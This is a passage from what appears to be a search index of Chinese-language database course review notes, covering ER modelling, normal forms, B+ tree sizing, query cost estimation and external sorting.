<li>entity \u5b9e\u4f53\uff1a\u7531\u957f\u65b9\u5f62\u8868\u793a\uff0cprimary key \u7528\u4e0b\u5212\u7ebf\u8868\u793a</li> <li>relationship \u5173\u7cfb\uff1a\u7531\u83f1\u5f62\u8868\u793a\uff0c\u8fde\u63a5\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684\u5b9e\u4f53</li> <li>constraint \u7ea6\u675f<ul> <li>\u6620\u5c04\u57fa\u6570\uff1a\u4e00\u5bf9\u4e00\u3001\u4e00\u5bf9\u591a\u3001\u591a\u5bf9\u4e00\u3001\u591a\u5bf9\u591a<ul> <li>\u7bad\u5934\u8868\u793a\u4e00\uff0c\u76f4\u7ebf\u8868\u793a\u591a</li> <li>\u4e09\u5143\u5173\u7cfb\u4e2d\u7bad\u5934\u53ea\u80fd\u51fa\u73b0\u4e00\u6b21</li> <li>\u76f4\u7ebf\u4e0a\u6807\u6ce8 <code>x...y</code> \u8868\u793a\u6700\u5c11 x \u4e2a\uff0c\u6700\u591a y \u4e2a\u5143\u7d20\u53c2\u4e0e\u5173\u7cfb\uff0c<code>*</code> \u8868\u793a\u4efb\u610f\u4e2a</li> </ul> </li> <li>\u53c2\u4e0e\u5ea6\u7ea6\u675f\uff1a\u5982\u679c\u5168\u90e8\u53c2\u4e0e\u5230\u5173\u7cfb\u4e2d\uff0c\u8981\u7528\u4e24\u6761\u7ebf</li> </ul> </li> <li>\u5f31\u5b9e\u4f53\u96c6 weak entity set<ul> <li>\u6ca1\u6709 primary key\uff0c\u4f9d\u8d56\u4e8e\u5176\u4ed6\u5b9e\u4f53\u5b58\u5728\uff0c\u5b9e\u4f53\u96c6\u5185\u5c5e\u6027\u7528\u865a\u7ebf\u8868\u793a</li> <li>\u4e0e\u5176\u4f9d\u8d56\u7684\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u7528\u53cc\u83f1\u5f62\u8868\u793a\uff0c\u79f0\u4e3a identifying relationship \u6807\u8bc6\u578b\u5173\u7cfb</li> <li>\u6bd4\u5982\uff1a\u4e00\u4e2a course \u4e0b\u4f1a\u6709\u591a\u4e2a section\uff0csection \u4f9d\u8d56\u4e8e course \u7684\u5b58\u5728\uff0c\u6240\u4ee5 section \u662f weak entity</li> </ul> </li> </ul>"},{"location":"cs/database/review/#er_1","title":"ER \u6a21\u578b\u8f6c\u6362\u4e3a\u5173\u7cfb\u6a21\u578b","text":"<ul> <li>\u5f3a\u5b9e\u4f53\u96c6\uff1a\u6bcf\u4e2a\u5b9e\u4f53\u96c6\u8f6c\u6362\u4e3a\u4e00\u4e2a\u8868\uff0c\u6bcf\u4e2a\u5c5e\u6027\u8f6c\u6362\u4e3a\u4e00\u4e2a\u5217     <code>course(course_id, title, dept_name)</code></li> <li>\u5f31\u5b9e\u4f53\u96c6\uff1a\u6bcf\u4e2a\u5b9e\u4f53\u96c6\u8f6c\u6362\u4e3a\u4e00\u4e2a\u8868\uff0c\u6bcf\u4e2a\u5c5e\u6027\u8f6c\u6362\u4e3a\u4e00\u4e2a\u5217\uff0c\u52a0\u4e0a\u4e00\u4e2a\u6307\u5411\u6807\u8bc6\u578b\u5173\u7cfb\u7684\u5916\u952e     <code>section(course_id, sec_id, semester, year, building, room_number)</code></li> <li>\u591a\u5bf9\u591a\u5173\u7cfb\uff1a\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65b0\u7684\u8868\uff0c\u5305\u542b\u4e24\u4e2a\u5b9e\u4f53\u96c6\u7684 primary key \u548c\u5176\u4ed6\u5c5e\u6027     <code>takes(student_id, course_id, sec_id)</code></li> <li>\u591a\u5bf9\u4e00\u5173\u7cfb\uff1a\u53ef\u4ee5\u4e0d\u8f6c\u6362\uff0c\u76f4\u63a5\u5728\u591a\u7684\u4e00\u65b9\u52a0\u4e0a\u4e00\u4e2a\u5916\u952e\u6307\u5411\u4e00\u7684\u4e00\u65b9</li> </ul>"},{"location":"cs/database/review/#_15","title":"\u6cdb\u5316\u5173\u7cfb","text":"<ul> <li>\u6982\u5316 generalization\uff1a\u5c06\u591a\u4e2a\u5b9e\u4f53\u96c6\u5408\u5e76\u4e3a\u4e00\u4e2a\u66f4\u9ad8\u5c42\u6b21\u7684\u5b9e\u4f53\u96c6\uff0c\u4ece\u4e0b\u5f80\u4e0a     \u76f8\u5f53\u4e8e\u4ece\u5b50\u7c7b\u5408\u5e76\u5230\u7236\u7c7b</li> <li>\u7279\u5316 specialization\uff1a\u5c06\u4e00\u4e2a\u5b9e\u4f53\u96c6\u5206\u4e3a\u591a\u4e2a\u66f4\u4f4e\u5c42\u6b21\u7684\u5b9e\u4f53\u96c6\uff0c\u4ece\u4e0a\u5f80\u4e0b     \u76f8\u5f53\u4e8e\u4ece\u7236\u7c7b\u7ee7\u627f\u5230\u5b50\u7c7b<ul> <li>partial specialization \u90e8\u5206\u7279\u5316\uff1a\u5b50\u7c7b\u7684\u5b9e\u4f53\u96c6\u4e0d\u5305\u542b\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027\uff0c\u5c06\u5b50\u7c7b\u548c\u7236\u7c7b\u8fdb\u884c\u8fde\u63a5\u624d\u662f\u6240\u6709\u4fe1\u606f</li> <li>total specialization \u5168\u90e8\u7279\u5316\uff1a\u5b50\u7c7b\u7684\u5b9e\u4f53\u96c6\u5305\u542b\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027</li> </ul> </li> </ul> <p>\u7ea6\u675f\uff1a</p> <ul> <li>overlap \u7ea6\u675f\uff1a\u5b50\u7c7b\u7684\u5b9e\u4f53\u96c6\u4e4b\u95f4\u53ef\u4ee5\u6709\u91cd\u53e0</li> <li>disjoint \u7ea6\u675f\uff1a\u5b50\u7c7b\u4e4b\u95f4\u4e0d\u91cd\u53e0</li> </ul>"},{"location":"cs/database/review/#_16","title":"\u5173\u7cfb\u6570\u636e\u5e93\u8bbe\u8ba1","text":""},{"location":"cs/database/review/#lossless-join-decomposition","title":"Lossless-join Decomposition \u65e0\u635f\u5206\u89e3","text":"<p>\u4e00\u4e2a\u5173\u7cfb R \u88ab\u5206\u89e3\u4e3a R1 \u548c R2\uff0c\u5982\u679c R1 \u548c R2 \u7684 natural join \u7b49\u4e8e R\uff0c\u90a3\u4e48\u79f0\u4e3a\u65e0\u635f\u5206\u89e3\u3002</p> <p>\u5982\u679c\u516c\u5171\u5c5e\u6027\u662f\u5176\u4e2d\u4e00\u4e2a\u5173\u7cfb\u7684 primary key\uff0c\u90a3\u4e48\u4e00\u5b9a\u662f\u65e0\u635f\u5206\u89e3\u3002\\(R_1 \\cap R_2 \\rightarrow R_1\\) \u6216\u8005 \\(R_1 \\cap R_2 \\rightarrow R_2\\)\u3002</p>"},{"location":"cs/database/review/#functional-dependency","title":"Functional Dependency \u51fd\u6570\u4f9d\u8d56","text":"<p>\\(A \\rightarrow B\\) \u8868\u793a \\(A\\)\u552f\u4e00\u786e\u5b9a \\(B\\)</p> <ul> <li>trival: \u5168\u96c6\u51b3\u5b9a\u5b50\u96c6\uff0c\u5bf9\u4e8e\u6240\u6709\u5173\u7cfb\u6a21\u5f0f\u90fd\u6210\u7acb</li> <li>\u95ed\u5305\uff1a\u5c5e\u6027\u96c6\u5408\u80fd\u63a8\u5bfc\u51fa\u6765\u7684\u6240\u6709\u5c5e\u6027\u6784\u6210\u7684\u96c6\u5408\u3002\\(A\\) \u7684\u5c5e\u6027\u95ed\u5305\u8868\u793a\u4e3a \\(A^+\\)</li> </ul>"},{"location":"cs/database/review/#dependency-preservation","title":"Dependency Preservation \u4f9d\u8d56\u4fdd\u6301","text":"<p>\u4e00\u4e2a\u5173\u7cfb R \u88ab\u5206\u89e3\u4e3a R1 \u548c R2\uff0c\u5982\u679c \\(F_1\\) \u548c \\(F_2\\) \u7684\u95ed\u5305\u80fd\u63a8\u5bfc\u51fa \\(F\\) \u7684\u95ed\u5305\uff0c\u90a3\u4e48\u79f0\u4e3a\u4f9d\u8d56\u4fdd\u6301\u3002</p>"},{"location":"cs/database/review/#normal-form","title":"Normal Form \u8303\u5f0f","text":"<ul> <li>1NF\uff1a\u5c5e\u6027\u662f\u539f\u5b50\u7684\uff0c\u4e0d\u53ef\u518d\u5206</li> <li>BCNF\uff1a\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56 \\(X \\rightarrow Y\\)\uff0c\u8981\u4e48\u662f\u5e73\u51e1\u7684\uff0c\u8981\u4e48 \\(X\\)\u662f super key     \u8ba1\u7b97 \\(X\\)\u7684\u5c5e\u6027\u95ed\u5305\uff0c\u5982\u679c\u95ed\u5305\u5305\u542b\u4e86\u6240\u6709\u5c5e\u6027\uff0c\u90a3\u4e48\u6ee1\u8db3 BCNF<ul> <li>Decomposing a Schema into BCNF<ol> <li>\u9009\u62e9\u4e00\u4e2a\u4e0d\u6ee1\u8db3 BCNF \u7684\u51fd\u6570\u4f9d\u8d56\uff0c\u5c06\u5176\u5355\u72ec\u4f5c\u4e3a\u4e00\u4e2a\u5173\u7cfb</li> <li>\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u76f4\u5230\u6240\u6709\u5173\u7cfb\u90fd\u6ee1\u8db3 BCNF</li> <li>\u5c06\u53ef\u5408\u5e76\u7684\u5173\u7cfb\u8fdb\u884c\u5408\u5e76</li> </ol> </li> </ul> </li> <li>3NF\uff1a\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56 \\(X \\rightarrow Y\\)\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u4e4b\u4e00<ul> <li>\u4f9d\u8d56\u662f\u5e73\u51e1\u7684</li> <li>\\(X\\)\u662f super key</li> <li>\u5bf9\u4e8e\u6bcf\u4e2a \\(Y - X\\) \u4e2d\u7684\u5c5e\u6027\uff0c\u90fd\u5305\u542b\u5728\u4e00\u4e2a candidate key \u4e2d</li> </ul> </li> </ul>"},{"location":"cs/database/review/#canonical-cover","title":"Canonical Cover \u6b63\u5219\u8986\u76d6","text":"<ul> <li> <p>\u65e0\u5173\u5c5e\u6027\uff1a\u5bf9\u4e8e \\(F\\) \u4e2d\u7684\u51fd\u6570\u4f9d\u8d56 \\(\\alpha \\rightarrow \\beta\\)</p> <ul> <li> <p>\\(\\alpha\\) \u4e2d\u7684\u5c5e\u6027 \\(A\\) \u662f\u591a\u4f59\u7684\uff0c\u5982\u679c \\(\\alpha - A\\) \u4e5f\u80fd\u63a8\u5bfc\u51fa \\(\\beta\\)</p> <p>\u5982\u679c \\((\\alpha - A)^+\\) \u5305\u542b \\(\\beta\\)\uff0c\u90a3\u4e48 \\(A\\) \u662f\u591a\u4f59\u7684</p> </li> <li> <p>\\(\\beta\\) \u4e2d\u7684\u5c5e\u6027 \\(B\\) \u662f\u591a\u4f59\u7684\uff0c\u5982\u679c\u5c06 \\(\\alpha \\rightarrow \\beta\\) \u66ff\u6362\u4e3a \\(\\alpha \\rightarrow \\beta - B\\)\uff0c\\(\\alpha^+\\) \u5305\u542b \\(B\\)</p> </li> </ul> </li> <li> <p>\u8ba1\u7b97\u6700\u5c0f\u8986\u76d6</p> <ol> <li>\u7528 union rule \u5c06\u6ee1\u8db3 \\(\\alpha \\rightarrow \\beta_1 \\land \\alpha \\rightarrow \\beta_2\\) \u7684\u51fd\u6570\u4f9d\u8d56\u5408\u5e76\u4e3a \\(\\alpha \\rightarrow \\beta_1 \\beta_2\\)</li> <li>\u53bb\u9664\u91cd\u590d\u5c5e\u6027</li> <li>\u91cd\u590d a, b \u4e24\u6b65\uff0c\u76f4\u5230\u4e0d\u80fd\u5408\u5e76\u4e3a\u6b62</li> </ol> </li> </ul>"},{"location":"cs/database/review/#_17","title":"\u6570\u636e\u5e93\u8bbe\u8ba1\u7406\u8bba","text":""},{"location":"cs/database/review/#storage-hierarchy","title":"Storage Hierarchy \u5b58\u50a8\u5c42\u6b21","text":"<ul> <li>\u6613\u5931\u5b58\u50a8 volatile storage</li> <li>\u975e\u6613\u5931\u5b58\u50a8 nonvolatile storage</li> </ul>"},{"location":"cs/database/review/#magnetic-disk","title":"\u78c1\u76d8\u5b58\u50a8 Magnetic Disk","text":"<ul> <li>\u8bfb\u5199\u5934 read/write head</li> <li>\u78c1\u9053 tracks\uff0c\u6bcf\u4e2a\u786c\u76d8\u6709\u591a\u4e2a\u78c1\u9053</li> <li>\u6247\u533a sector\uff0c\u7531\u78c1\u9053\u5212\u5206\uff0c\u6bcf\u4e2a\u6247\u533a 512 \u5b57\u8282</li> </ul> <p>\u6027\u80fd\u8bc4\u4f30\uff1a</p> <ul> <li>access time = seek time + rotational delay<ul> <li>seek time \u5bfb\u9053\u65f6\u95f4\uff0c\u8bfb\u5199\u5934\u79fb\u52a8\u5230\u6b63\u786e\u7684\u78c1\u9053\u4e0a\u7684\u65f6\u95f4</li> <li>rotational delay \u65cb\u8f6c\u5ef6\u8fdf\uff0c\u7b49\u5f85\u6247\u533a\u65cb\u8f6c\u5230\u8bfb\u5199\u5934\u4e0b\u7684\u65f6\u95f4</li> </ul> </li> <li>data transfer rate \u6570\u636e\u4f20\u8f93\u901f\u7387\uff0c\u8bfb\u5199\u6570\u636e\u7684\u901f\u7387</li> <li>MTTF\uff1a\u51fa\u73b0\u6545\u969c\u7684\u5e73\u5747\u65f6\u95f4</li> </ul>"},{"location":"cs/database/review/#buffer-management","title":"Buffer Management \u7f13\u51b2\u7ba1\u7406","text":"<p>\u89c1 minisql</p>"},{"location":"cs/database/review/#index","title":"Index \u7d22\u5f15","text":"<ul> <li>primary index \u4e3b\u7d22\u5f15\uff0c\u7d22\u5f15\u7684 key \u662f primary key\uff0c\u5728\u6587\u4ef6\u4e2d\u6309\u7167 key \u7684\u987a\u5e8f\u5b58\u50a8</li> <li>secondary index \u8f85\u52a9\u7d22\u5f15\uff0c\u7d22\u5f15\u987a\u5e8f\u548c\u6587\u4ef6\u4e2d\u7684\u987a\u5e8f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u4e0d\u4e00\u5b9a\u662f\u552f\u4e00\u7684</li> </ul> <p>\u8861\u91cf\u6307\u6807\uff1a</p> <ul> <li>point query \u5355\u70b9\u67e5\u8be2</li> <li>range query \u8303\u56f4\u67e5\u8be2</li> </ul> <p>B+ \u6811\u8282\u70b9\u6570\u4f30\u8ba1</p> <p>\u5bf9\u4e8e schema\uff1a <pre><code>person(pid char(18) primary key,\n       name char(8),\n       age smallint,\n       address char(40));\n</code></pre> block size \u4e3a 4KB\uff0c\u5171\u6709 \\(10^6\\) \u6761\u8bb0\u5f55</p> <ul> <li>person record size: \\(18 + 8 + 2 + 40 = 68 bytes\\)</li> <li>\u6bcf\u4e2a block \u53ef\u4ee5\u5b58\u50a8 \\(\\lfloor 4096 / 68 \\rfloor = 60\\) \u6761\u8bb0\u5f55</li> <li>\u5b58\u50a8\u6240\u6709\u8bb0\u5f55\u9700\u8981 \\(\\lceil 10^6 / 60 \\rceil = 16667\\) \u4e2a block</li> <li>B+ \u6811 fan-out\uff1a\u7d22\u5f15\u9879\u4e3a 18 bytes\uff0c\u6307\u9488\u4e3a 4 bytes\uff0c\u6bcf\u4e2a\u8282\u70b9\u4e2d\u6307\u9488\u6bd4\u7d22\u5f15\u9879\u591a 1\uff0c\u6240\u4ee5 fan-out \u4e3a \\(\\lfloor (4096 - 4) / (18 + 4) \\rfloor + 1 = 187\\)\u3002<ul> <li>\u5bf9\u4e8e\u5185\u90e8\u8282\u70b9\uff0c\u6700\u591a\u6709 187 \u4e2a\u5b50\u8282\u70b9\uff0c\u6700\u5c11\u6709 94 \u4e2a\u5b50\u8282\u70b9</li> <li>\u5bf9\u4e8e\u53f6\u5b50\u8282\u70b9\uff0c\u6700\u591a\u6709 186 \u4e2a\u7d22\u5f15\u9879\uff0c\u6700\u5c11\u6709 93 \u4e2a\u7d22\u5f15\u9879</li> </ul> </li> <li> <p>\u4e0d\u540c\u5c42\u6570 b+ \u6811\u7684\u8282\u70b9\u6570\uff1a</p> <ul> <li>2-level: min=\\(2 \\times 93 = 186\\), max=\\(187 \\times 186 = 34782\\)</li> <li>3-level: min=\\(2 \\times 94 \\times 93 = 17484\\), max=\\(187 \\times 187 \\times 186 = 6504234\\)</li> <li>4-level: min=\\(2 \\times 94 \\times 94 \\times 93 = 1643496\\), max=\\(187 \\times 187 \\times 187 \\times 186\\)</li> </ul> <p>\u5f97\u5230 \\(10^6\\) \u6761\u8bb0\u5f55\u7684\u7d22\u5f15\u6811\u6709 3 \u5c42\u3002</p> </li> </ul> <p>LSM \u6811\uff1a\u5c06\u7d22\u5f15\u7ed3\u6784\u5206\u4e3a\u82e5\u5e72\u5c42\uff0c\u8d8a\u5e95\u5c42\u7684\u7d22\u5f15\u8d8a\u5927\u3002</p> <ul> <li>\u63d2\u5165\uff1a\u5f53\u4e0a\u5c42\u7684\u7d22\u5f15\u6ee1\u4e86\u4e4b\u540e\uff0c\u5c06\u6570\u636e\u5408\u5e76\u5230\u4e0b\u5c42\u3002</li> <li>\u67e5\u627e\uff1a\u4ece\u4e0a\u5f80\u4e0b\u67e5\u627e\uff0c\u5982\u679c\u4e0a\u5c42\u6ca1\u6709\u627e\u5230\uff0c\u5c31\u53bb\u4e0b\u5c42\u67e5\u627e\u3002</li> </ul>"},{"location":"cs/database/review/#query-processing","title":"Query Processing \u67e5\u8be2\u5904\u7406","text":""},{"location":"cs/database/review/#_18","title":"\u57fa\u7840\u6b65\u9aa4","text":"<ul> <li>parsing and translation \u5c06\u67e5\u8be2\u8bed\u53e5\u8f6c\u6362\u4e3a\u5173\u7cfb\u4ee3\u6570\u8868\u8fbe\u5f0f</li> <li>optimization \u4f18\u5316\u67e5\u8be2\u8ba1\u5212\uff0c\u8f6c\u6362\u4e3a\u6267\u884c\u8ba1\u5212</li> <li>evaluation \u6267\u884c\u8ba1\u5212\uff0c\u83b7\u53d6\u7ed3\u679c</li> </ul>"},{"location":"cs/database/review/#_19","title":"\u4ee3\u4ef7\u4f30\u7b97","text":"<p>\u4f30\u7b97\u6307\u6807\uff1a</p> <ul> <li>number of seeks\uff1a\u78c1\u76d8\u5bfb\u627e\u6b21\u6570</li> <li>number of block transfers\uff1a\u78c1\u76d8\u8bfb\u5199\u6b21\u6570</li> </ul>"},{"location":"cs/database/review/#select-operation","title":"Select Operation","text":"<ol> <li>A1\uff08linear search\uff09\uff1a\u626b\u63cf\u6240\u6709\u8bb0\u5f55\uff0c\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55<ul> <li>worst cost: \\(t_{seek} + b_r \\times t_{trans}\\)\uff0c\\(t_s\\) \u4e3a seek time\uff0c\\(b_r\\) \u4e3a\u8981\u4f20\u8f93\u7684\u5757\u6570\uff0c\\(t_t\\) \u4e3a\u4f20\u8f93\u4e00\u5757\u7684\u65f6\u95f4</li> <li>average cost: \\(t_s + (b_r / 2) \\times t_t\\)</li> </ul> </li> <li>A2\uff08B+ index search, on key\uff09\uff1a\u901a\u8fc7 B+ \u6811\u7d22\u5f15\u627e\u5230\u8bb0\u5f55\uff0cB+ \u6811\u4e2d\u7684 key \u552f\u4e00\u3002<ul> <li>cost: \\((h_i + 1) \\times (t_s + t_t)\\)\uff0c\\(h_i\\) \u4e3a B+ \u6811\u7684\u9ad8\u5ea6\uff0c\u5bf9\u4e8e\u6811\u4e0a\u67e5\u627e\u8def\u5f84\u7684\u6bcf\u4e00\u5757\u548c\u6700\u540e\u5b9e\u9645\u5b58\u653e\u8bb0\u5f55\u7684\u5757\u90fd\u8981\u8fdb\u884c seek \u548c transfer</li> </ul> </li> <li>A3\uff08B+ index search, on non-key\uff09\uff1a\u901a\u8fc7 B+ \u6811\u7d22\u5f15\u627e\u5230\u8bb0\u5f55\uff0cB+ \u6811\u4e2d\u7684 key \u4e0d\u552f\u4e00\u3002<ul> <li>cost: \\(h_i \\times (t_s + t_t) + t_s + b \\times t_t\\)\uff0cB+ \u6811\u4e2d\u5b58\u653e\u7684\u662f\u6bcf\u4e2a key \u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u901a\u8fc7\u53f6\u8282\u70b9\u7684\u6307\u9488\u627e\u5230\u5b9e\u9645\u5b58\u653e\u8bb0\u5f55\u7684\u5757\uff0c\u7136\u540e\u626b\u63cf\u5757\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55</li> </ul> </li> <li>A4\uff08secondary index search, equality on key\uff09\uff1a\u5efa\u7acb\u5728 key \u4e0a\u7684\u8f85\u52a9\u7d22\u5f15\uff0c\u548c\u4e3b\u7d22\u5f15\u7c7b\u4f3c<ul> <li>cost: \\((h_i + 1) \\times (t_s + t_t)\\)</li> </ul> </li> <li>A4'\uff08secondary index search, equality on non-key\uff09\uff1a\u5efa\u7acb\u5728\u975e key \u4e0a\u7684\u8f85\u52a9\u7d22\u5f15<ul> <li>\u53f6\u8282\u70b9\u5b58\u653e\u7684\u662f\u6307\u5411\u5b58\u653e\u6307\u5411\u5b9e\u9645\u8bb0\u5f55\u7684\u6307\u9488\u5757\u7684\u6307\u9488\uff0c\u627e\u5230\u53f6\u8282\u70b9\u540e\uff0c\u8981\u5728\u6307\u9488\u5757\u4e2d\u627e\u5230\u6307\u9488\uff0c\u518d\u627e\u5230\u5b9e\u9645\u8bb0\u5f55</li> <li>cost: \\((h_i + m + n) \\times (t_s + t_t)\\)\uff0cm \u4e3a\u6307\u9488\u5757\u7684\u6570\u91cf\uff0cn \u4e3a\u5b9e\u9645\u8bb0\u5f55\u7684\u6570\u91cf\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u8bb0\u5f55\u90fd\u5728\u4e0d\u540c\u7684\u5757\u4e2d</li> </ul> </li> <li>A5\uff08primary B+ index, comparison\uff09\uff1a\u4e3b\u7d22\u5f15\u4e0a\u7684\u6bd4\u8f83\u67e5\u627e\uff0c\u9700\u8981\u627e\u5230\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55\uff0c\u5f80\u540e\u626b\u63cf<ul> <li>cost: \\(h_i \\times (t_s + t_t) + t_s + b \\times t_t\\)</li> </ul> </li> <li>A6\uff08secondary index, comparison\uff09\uff1a\u8f85\u52a9\u7d22\u5f15\u4e0a\u7684\u6bd4\u8f83\u67e5\u627e<ul> <li>\u4e00\u822c\u7528\u7ebf\u6027\u626b\u63cf</li> </ul> </li> </ol>"},{"location":"cs/database/review/#complex-selection","title":"Complex Selection","text":"<ol> <li>Conjunctive Selection\uff1a\u591a\u4e2a\u6761\u4ef6\u7684 and \\(\\sigma_{\\theta_1 \\land \\theta_2 \\land \\cdots \\land \\theta_n}(r)\\)<ul> <li>\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u6761\u4ef6\u6709\u7d22\u5f15\uff0c\u5c31\u7528\u7d22\u5f15\u627e\u5230\u8bb0\u5f55\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5176\u4ed6\u6761\u4ef6\u7684\u5224\u65ad</li> <li>\u6709\u8054\u5408\u7d22\u5f15\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528\u8054\u5408\u7d22\u5f15\u627e\u5230\u8bb0\u5f55</li> <li>\u5206\u522b\u7528\u7d22\u5f15\u627e\u5230\u8bb0\u5f55\uff0c\u7136\u540e\u53d6\u4ea4\u96c6</li> </ul> </li> <li>Disjunctive Selection\uff1a\u591a\u4e2a\u6761\u4ef6\u7684 or \\(\\sigma_{\\theta_1 \\lor \\theta_2 \\lor \\cdots \\lor \\theta_n}(r)\\)<ul> <li>\u7528\u7d22\u5f15\u627e\u5230\u8bb0\u5f55\uff0c\u7136\u540e\u53d6\u5e76\u96c6</li> <li>\u7ebf\u6027\u626b\u63cf</li> </ul> </li> <li>Not Selection\uff1a\\(\\sigma_{\\lnot \\theta}(r)\\)<ul> <li>\u76f4\u63a5\u4f7f\u7528\u7d22\u5f15</li> <li>\u7ebf\u6027\u626b\u63cf</li> </ul> </li> </ol>"},{"location":"cs/database/review/#external-sorting","title":"External Sorting","text":"<p>\u5047\u8bbe\u6709 M \u4e2a\u5185\u5b58\u5757</p> <ol> <li>\u521b\u5efa\u521d\u59cb\u5f52\u5e76\u6bb5 run<ul> <li>\u8bfb\u53d6 M \u4e2a\u5757\u5230\u5185\u5b58\u4e2d</li> <li>\u5bf9\u8fd9\u4e9b\u5757\u8fdb\u884c\u6392\u5e8f</li> <li>\u5199\u56de\u5230\u78c1\u76d8\u4e2d\uff0c\u5f97\u5230\u4e00\u4e2a run</li> <li>\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u76f4\u5230\u6240\u6709\u8bb0\u5f55\u90fd\u88ab\u8bfb\u53d6\uff0c\u603b\u5171\u7684 run \u6570\u4e3a \\(N = \\lceil b_r / M \\rceil\\)</li> </ul> </li> <li>\u5f52\u5e76<ul> <li>\u5982\u679c \\(N &lt; M\\)\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u4e00\u6b21 N \u8def\u5f52\u5e76\uff0c\u5c06\u5185\u5b58\u4e2d N \u5757\u4f5c\u4e3a\u8f93\u5165\u7f13\u51b2\uff0c1 \u5757\u4f5c\u4e3a\u8f93\u51fa\u7f13\u51b2<ul> <li>\u6bcf\u6b21\u5c06\u8f93\u5165\u7f13\u51b2\u4e2d\u6700\u5c0f\u7684\u8bb0\u5f55\u5199\u5165\u8f93\u51fa\u7f13\u51b2</li> <li>\u82e5\u8f93\u51fa\u7f13\u51b2\u6ee1\uff0c\u5199\u5165\u78c1\u76d8\uff0c\u6e05\u7a7a\u8f93\u51fa\u7f13\u51b2</li> <li>\u82e5\u8f93\u5165\u7f13\u51b2\u4e2d\u6709\u5757\u8bfb\u5b8c\uff0c\u8bfb\u53d6\u5bf9\u5e94 run \u7684\u4e0b\u4e00\u5757</li> </ul> </li> <li>\u5982\u679c \\(N \\geq M\\)\uff0c\u5219\u9700\u8981\u591a\u6b21 \\(M-1\\) \u8def\u5f52\u5e76\uff0c\u6bcf\u6b21\u5c06 \\(M-1\\) \u4e2a run \u5f52\u5e76\u4e3a\u4e00\u4e2a run\uff0c\u76f4\u5230\u6240\u6709 run \u5f52\u5e76\u4e3a\u4e00\u4e2a run<ul> <li>\u6bcf\u6b21 run \u7684\u4e2a\u6570\u4f1a\u51cf\u5c11\u5230\u539f\u6765\u7684 \\(\\frac{1}{M-1}\\)\uff0c\u603b\u5171\u9700\u8981 \\(\\lceil \\log_{M-1} N \\rceil\\) \u6b21\u5f52\u5e76</li> </ul> </li> </ul> </li> </ol> <p>Cost Analysis</p> <ul> <li>runs \u4e2a\u6570\uff1a\\(N = \\lceil b_r / M \\rceil\\)</li> <li>\u5f52\u5e76\u8f6e\u6570\uff1a\\(\\lceil \\log_{M-1} \\lceil b_r / M \\rceil \\rceil\\)</li> <li>transfer \u6b21\u6570<ul> <li>\u521b\u5efa\u521d\u59cb\u5f52\u5e76\u6bb5\u548c\u6bcf\u6b21\u5f52\u5e76\u9700\u8981 \\(2 \\times b_r\\) \u6b21 transfer\uff0c\u8bfb\u548c\u5199\u5404\u4e00\u6b21</li> <li>\u6700\u540e\u4e00\u6b21\u5f52\u5e76\u7684\u7ed3\u679c\u4e0d\u4e00\u5b9a\u9700\u8981\u5199\u5165\u78c1\u76d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u603b\u5171\u9700\u8981 \\(2 b_r (\\lceil \\log_{M-1} \\lceil b_r / M \\rceil \\rceil + 1) - b_r = b_r \\times (2 \\times \\lceil \\log_{M-1} \\lceil b_r / M \\rceil \\rceil + 1)\\) \u6b21 transfer</li> </ul> </li> <li>seek \u6b21\u6570<ul> <li>\u521b\u5efa\u521d\u59cb\u5f52\u5e76\u6bb5\u9700\u8981 \\(2 \\times N\\) \u6b21 seek\uff0c\u6bcf\u4e2a run \u8bfb\u548c\u5199\u5404\u4e00\u6b21</li> <li>\u6bcf\u6b21\u5f52\u5e76\u9700\u8981 \\(2 \\times b_r\\) \u6b21 seek\uff0c\u56e0\u4e3a\u6570\u636e\u662f\u6309\u7167\u5757\u8bfb\u53d6\u5199\u56de\u7684</li> <li>\u6700\u540e\u4e00\u6b21\u5f52\u5e76\u7684\u7ed3\u679c\u4e0d\u4e00\u5b9a\u9700\u8981\u5199\u5165\u78c1\u76d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u603b\u5171\u9700\u8981 \\(b_r (2 \\lceil \\log_{M-1} \\lceil b_r / M \\rceil \\rceil - 1) + 2 \\lceil b_r / M \\rceil\\) \u6b21 seek</li> </ul> </li> </ul> <p>\u5047\u5982\u5185\u5b58\u4e2d\u7ed9\u6bcf\u4e00\u8def\u5206\u914d\u4e86 \\(b_b\\) \u4e2a\u8f93\u5165\u7f13\u51b2\u5757\uff0c\u540c\u65f6\u8f93\u51fa\u7f13\u51b2\u5757\u4e5f\u662f \\(b_b\\) \u4e2a\uff0c\u90a3\u4e48</p> <ul> <li>\u5f52\u5e76\u8f6e\u6570\uff1a\\(\\lceil \\log_{M/b_b - 1} \\lceil b_r / M \\rceil \\rceil\\)</li> <li>transfer \u6b21\u6570\uff1a<ul> <li>\u521b\u5efa\u521d\u59cb\u5f52\u5e76\u6bb5\u548c\u6bcf\u6b21\u5f52\u5e76\u9700\u8981\u7684 transfer \u6b21\u6570\u4e0d\u53d8\uff0c\u4e3a \\(2 \\times b_r\\) \u6b21</li> 